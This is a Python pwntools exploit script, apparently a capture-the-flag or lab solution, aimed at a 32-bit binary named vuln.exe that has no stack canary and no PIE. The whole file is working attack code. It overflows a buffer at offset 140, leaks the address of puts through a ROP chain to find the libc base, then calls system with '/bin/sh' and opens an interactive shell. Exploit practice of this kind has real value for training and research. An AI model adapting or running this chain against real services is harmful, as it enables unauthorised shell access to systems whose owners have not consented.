#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln.exe --host localhost --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./vuln.exe')
context.update(arch='i386', os="linux")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1234)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()
offset = 140
libc = ELF('./libc.so.6')
io.recvline() # receive the "Give me some text"
io.sendline(fit({offset:exe.sym.main}))
# force the program to run main
io.recvline() # receive the text that is printed
io.recvline() # receive the "Give me some text"
rop = ROP(exe)
rop.call(exe.symbols['puts'], [exe.got['puts']])
rop.call(exe.symbols['main'])
io.sendline(fit({offset:rop.chain()}))
io.recvline()
puts_addr = u32(io.recvline()[:4])
log.info(f"Puts at address: {hex(puts_addr)}")
libc.address = puts_addr - libc.symbols['puts']
log.info(f"libc base address: {hex(libc.address)}")
system_add = libc.symbols['system']
binsh_add = next(libc.search(b'/bin/sh'))
rop2 = ROP(exe)
rop2.call(system_add, [binsh_add])
log.info("Stage II ROP Chain:\n" + rop2.dump())
io.sendline(fit({offset:rop2.chain()}))
io.interactive()

